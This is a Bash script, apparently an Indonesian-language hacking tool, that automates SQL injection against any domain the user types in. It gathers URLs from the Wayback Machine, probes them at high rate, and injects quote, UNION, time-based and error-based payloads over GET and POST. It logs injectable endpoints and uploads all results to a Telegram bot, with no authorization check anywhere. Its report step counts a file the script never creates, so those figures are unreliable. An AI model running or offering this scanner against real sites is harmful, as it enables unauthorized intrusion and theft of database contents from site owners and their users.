#!/bin/bash

# Colors
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'

# Progress bar configuration
BAR_WIDTH=50
BAR_CHAR_DONE="#"
BAR_CHAR_TODO="-"
BRACKET_DONE="["
BRACKET_TODO="]"

# Progress bar function
display_progress() {
    local current=$1
    local total=$2
    local title=$3
    local percent=$((current * 100 / total))
    local done=$((percent * BAR_WIDTH / 100))
    local todo=$((BAR_WIDTH - done))

    printf "\r${YELLOW}[*] %s: ${BRACKET_DONE}" "${title}"
    printf "%${done}s" | tr " " "${BAR_CHAR_DONE}"
    printf "%${todo}s${BRACKET_TODO} %3d%%" | tr " " "${BAR_CHAR_TODO}"
    echo -en " ($current/$total)${NC}"
}

# Banner function
display_banner() {
    clear
    echo -e "${BLUE}"
    figlet -w 100 -f small "Single Auto SQL Injection"
    echo -e "${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Input target function
input_target() {
    clear
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║          Single Auto SQL Injection          ${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}\n"
    
    while true; do
        echo -e "${YELLOW}[?] Masukkan domain target ${NC}(contoh: example.com)"
        echo -e "${YELLOW}[?] Ketik 'quit' untuk keluar${NC}"
        echo -ne "\n${GREEN}[+] Target Domain: ${NC}"
        read -r input
        
        # Validasi input
        if [[ -z "$input" ]]; then
            echo -e "\n${RED}[!] Error: Domain tidak boleh kosong!${NC}"
            sleep 1
            continue
        elif [[ "$input" == "quit" ]]; then
            echo -e "\n${YELLOW}[!] Keluar dari program...${NC}"
            exit 0
        elif ! [[ "$input" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            echo -e "\n${RED}[!] Error: Format domain tidak valid!${NC}"
            sleep 1
            continue
        fi
        
        # Jika validasi berhasil
        echo -e "\n${GREEN}[✓] Domain target valid: $input${NC}"
        echo -e "${BLUE}[*] Memulai pemindaian...${NC}\n"
        sleep 1
        domain="$input"  # Set domain variable
        workspace="$input"  # Set workspace variable
        break
    done
    return 0
}

# Setup workspace
setup_workspace() {
    echo -e "\n${BLUE}[+] Setting up workspace...${NC}"
    mkdir -p "$workspace"/{sources,result/{sqli,wayback,gf}}
    echo -e "${GREEN}[✓] Workspace created${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# WAF detection
check_waf() {
    echo -e "\n${BLUE}[+] Checking Web Application Firewall...${NC}"
    if command -v wafw00f &> /dev/null; then
        wafw00f "$domain" | tee "$workspace/result/waf_detection.txt"
    else
        echo -e "${YELLOW}[!] wafw00f not found - performing basic WAF check${NC}"
        curl -sI "https://$domain" | grep -i "WAF" | tee "$workspace/result/waf_detection.txt"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Wayback data collection
collect_wayback() {
    echo -e "\n${BLUE}[+] Collecting URLs from Wayback Machine...${NC}"
    
    if command -v waybackurls &> /dev/null; then
        echo "https://$domain/" | waybackurls | anew "$workspace/result/wayback/wayback-tmp.txt"
        
        echo -e "${MAGENTA}[*] Filtering relevant URLs...${NC}"
        cat "$workspace/result/wayback/wayback-tmp.txt" 2>/dev/null | \
            egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.png|\.css|\.ico" | \
            sed 's/:80//g;s/:443//g' | sort -u > "$workspace/result/wayback/wayback.txt"
        
        rm -f "$workspace/result/wayback/wayback-tmp.txt"
        total_urls=$(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $total_urls unique URLs${NC}"
    else
        echo -e "${RED}[!] waybackurls not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# URL validation
validate_urls() {
    echo -e "\n${BLUE}[+] Validating discovered URLs...${NC}"
    if [[ -f "$workspace/result/wayback/wayback.txt" ]]; then
        ffuf -c -u "FUZZ" -w "$workspace/result/wayback/wayback.txt" -of csv -o "$workspace/result/wayback/valid-tmp.txt" \
             -t 100 -rate 1000
        
        cat "$workspace/result/wayback/valid-tmp.txt" 2>/dev/null | grep http | awk -F "," '{print $1}' > "$workspace/result/wayback/valid.txt"
        rm -f "$workspace/result/wayback/valid-tmp.txt"
        
        valid_count=$(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $valid_count valid URLs${NC}"
    else
        echo -e "${RED}[!] No URLs found to validate${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# GF pattern matching
run_gf_patterns() {
    echo -e "\n${BLUE}[+] Running GF pattern matching...${NC}"
    
    if ! command -v gf &> /dev/null; then
        echo -e "${RED}[!] gf not found${NC}"
        return 1
    fi
    
    patterns=("sqli" "reflection" "debug_logic" "interestingparams")
    total_patterns=${#patterns[@]}
    current=0
    
    for pattern in "${patterns[@]}"; do
        ((current++))
        echo -e "${MAGENTA}[*] ($current/$total_patterns) Checking for $pattern patterns...${NC}"
        gf "$pattern" "$workspace/result/wayback/valid.txt" 2>/dev/null | tee "$workspace/result/gf/${pattern}.txt"
        count=$(wc -l < "$workspace/result/gf/${pattern}.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $count potential $pattern endpoints${NC}"
    done
    
    echo -e "${GREEN}[✓] Pattern matching completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# SQL injection testing
test_sqli() {
    echo -e "\n${BLUE}[+] Testing for SQL Injection vulnerabilities...${NC}"
    
    # Ensure the SQL pattern file exists and create results directory
    if [[ ! -f "$domain/result/gf/sqli.txt" ]]; then
        echo -e "${RED}[!] SQL pattern file not found!${NC}"
        return 1
    fi
    mkdir -p "$domain/result/sqli"
    
    total_urls=$(wc -l < "$domain/result/gf/sqli.txt")
    current=0
    vulnerable=0
    
    # SQL injection payloads
    declare -a payloads=(
        "%27"                   # Single quote
        "%22"                   # Double quote
        "%60"                   # Backtick
        "'OR'1'='1"            # Basic OR injection
        "'+OR+1=1--"           # OR injection with comment
        "'+UNION+SELECT+NULL--" # UNION SELECT injection
        "'+AND+1=1--"          # AND injection
        "'+AND+SLEEP(5)--"     # Time-based injection
        "'+WAITFOR+DELAY+'0:0:5'--" # Time-based for MSSQL
        "'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT(0x3a,0x3a,(SELECT+@@version),0x3a,0x3a,FLOOR(RAND(0)*2))a+FROM+information_schema.tables+GROUP+BY+a)b)--" # Error-based injection
    )
    
    # Error patterns to detect SQL injection - More specific patterns to reduce false positives
    declare -a error_patterns=(
        "mysql_fetch_array()"
        "You have an error in your SQL syntax"
        "ORA-00933: SQL command not properly ended"
        "PostgreSQL ERROR:"
        "Microsoft SQL Native Client error"
        "Warning: mssql_query()"
        "Microsoft OLE DB Provider for ODBC Drivers error"
        "SQLITE_ERROR"
        "[Microsoft][ODBC SQL Server Driver]"
        "org.postgresql.util.PSQLException"
        "java.sql.SQLException"
        "System.Data.SqlClient.SqlException"
        "Unclosed quotation mark after the character string"
    )
    
    while IFS= read -r url; do
        ((current++))
        echo -e "\n${YELLOW}[*] Testing URL ($current/$total_urls)${NC}"
        
        for payload in "${payloads[@]}"; do
            test_url="${url}${payload}"
            
            # Test GET request
            start_time=$(date +%s.%N)
            response=$(curl -s -L --max-time 15 -H "User-Agent: Mozilla/5.0" "$test_url")
            end_time=$(date +%s.%N)
            duration=$(echo "$end_time - $start_time" | bc)
            
            # Double verification for error-based injection
            error_count=0
            for pattern in "${error_patterns[@]}"; do
                if echo "$response" | grep -qi "$pattern"; then
                    ((error_count++))
                    if [ $error_count -ge 2 ]; then  # Require at least 2 error patterns for confirmation
                        echo -e "\n${RED}[!] Confirmed SQL Injection Vulnerability${NC}"
                        echo -e "${RED}[!] Vulnerable URL: ${test_url}${NC}"
                        echo "$test_url" >> "$domain/result/sqli/error_based.txt"
                        ((vulnerable++))
                        break 2  # Break both loops once confirmed
                    fi
                fi
            done
            
            # Strict time-based injection check with multiple attempts
            if (( $(echo "$duration > 4.9" | bc -l) )); then
                # Verify with a second request
                start_time2=$(date +%s.%N)
                curl -s -L --max-time 15 -H "User-Agent: Mozilla/5.0" "$test_url" > /dev/null
                end_time2=$(date +%s.%N)
                duration2=$(echo "$end_time2 - $start_time2" | bc)
                
                if (( $(echo "$duration2 > 4.9" | bc -l) )); then
                    echo -e "\n${RED}[!] Confirmed Time-based SQL Injection${NC}"
                    echo -e "${RED}[!] Vulnerable URL: ${test_url}${NC}"
                    echo "$test_url" >> "$domain/result/sqli/time_based.txt"
                    ((vulnerable++))
                    break  # Move to next URL after finding vulnerability
                fi
            fi
            
            # Test POST request if URL has parameters
            if [[ "$url" == *"="* ]]; then
                params=$(echo "$url" | grep -o '[^?]*$')
                base_url=$(echo "$url" | sed 's/?.*//')
                post_data="${params}${payload}"
                
                post_response=$(curl -s -L --max-time 15 -X POST \
                    -H "Content-Type: application/x-www-form-urlencoded" \
                    -H "User-Agent: Mozilla/5.0" \
                    -d "$post_data" "$base_url")
                
                # Double verification for POST-based injection
                error_count=0
                for pattern in "${error_patterns[@]}"; do
                    if echo "$post_response" | grep -qi "$pattern"; then
                        ((error_count++))
                        if [ $error_count -ge 2 ]; then
                            echo -e "\n${RED}[!] Confirmed POST SQL Injection${NC}"
                            echo -e "${RED}[!] Vulnerable URL: ${base_url}${NC}"
                            echo -e "${RED}[!] POST Data: ${post_data}${NC}"
                            echo "${base_url} [POST] ${post_data}" >> "$domain/result/sqli/post_vulnerable.txt"
                            ((vulnerable++))
                            break 2
                        fi
                    fi
                done
            fi
        done
    done < "$domain/result/gf/sqli.txt"
    
    # Display only confirmed vulnerabilities
    echo -e "\n${BLUE}[*] Confirmed SQL Injection Vulnerabilities:${NC}"
    
    if [ -f "$domain/result/sqli/error_based.txt" ] && [ -s "$domain/result/sqli/error_based.txt" ]; then
        echo -e "\n${RED}[!] Error-based Vulnerabilities:${NC}"
        cat "$domain/result/sqli/error_based.txt"
    fi
    
    if [ -f "$domain/result/sqli/time_based.txt" ] && [ -s "$domain/result/sqli/time_based.txt" ]; then
        echo -e "\n${RED}[!] Time-based Vulnerabilities:${NC}"
        cat "$domain/result/sqli/time_based.txt"
    fi
    
    if [ -f "$domain/result/sqli/post_vulnerable.txt" ] && [ -s "$domain/result/sqli/post_vulnerable.txt" ]; then
        echo -e "\n${RED}[!] POST Vulnerabilities:${NC}"
        cat "$domain/result/sqli/post_vulnerable.txt"
    fi
    
    echo -e "\n${GREEN}[✓] Total confirmed vulnerabilities: $vulnerable${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}
# Generate summary report
generate_report() {
    echo -e "\n${BLUE}[+] Generating summary report...${NC}"
    
    report_file="$workspace/result/sqli/summary_report.txt"
    
    {
        echo "SQL Injection Vulnerability Scan Report"
        echo "====================================="
        echo "Date: $(date)"
        echo "Target Domain: $domain"
        echo ""
        echo "Scan Statistics:"
        echo "---------------"
        echo "Total URLs Scanned: $(wc -l < "$workspace/result/gf/sqli.txt" 2>/dev/null || echo "0")"
        echo "Vulnerable Endpoints: $(wc -l < "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo "0")"
        echo ""
        echo "Findings:"
        echo "---------"
        if [[ -f "$workspace/result/sqli/vulnerable.txt" ]]; then
            cat "$workspace/result/sqli/vulnerable.txt"
        else
            echo "No vulnerabilities found"
        fi
    } > "$report_file"
    
    echo -e "${GREEN}[✓] Report generated: $report_file${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Send results to Telegram
send_to_telegram() {
    if [[ -f telegram_token.txt && -f telegram_chat_id.txt ]]; then
        echo -e "\n${BLUE}[+] Sending results to Telegram...${NC}"
        
        token=$(cat telegram_token.txt)
        chat_id=$(cat telegram_chat_id.txt)
        
        message="🔍 SQL Injection scan completed for: $domain
📊 Summary:
• Total URLs: $(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
• Valid URLs: $(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
• SQL Injectable URLs: $(wc -l < "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo "0")
📤 Sending detailed results..."

        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
             -d chat_id="$chat_id" \
             -d text="$message" > /dev/null 2>&1

        # Send files with progress tracking
        total_files=$(find "$workspace" -type f | wc -l)
        current=0
        
        find "$workspace" -type f | while read -r file; do
            ((current++))
            echo -e "${MAGENTA}[*] Sending file ($current/$total_files): $(basename "$file")${NC}"
            curl -s -F chat_id="$chat_id" \
                 -F document=@"$file" \
                 "https://api.telegram.org/bot$token/sendDocument" > /dev/null 2>&1
        done

        echo -e "${GREEN}[✓] Results sent to Telegram${NC}"
    else
        echo -e "${RED}[!] Telegram credentials not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Main execution
main() {
    display_banner
    input_target
    setup_workspace
    check_waf
    collect_wayback
    validate_urls
    run_gf_patterns
    test_sqli
    generate_report
    send_to_telegram
    echo -e "\n${GREEN}[✓] SQL Injection scan completed successfully!${NC}\n"
}

# Run the script
main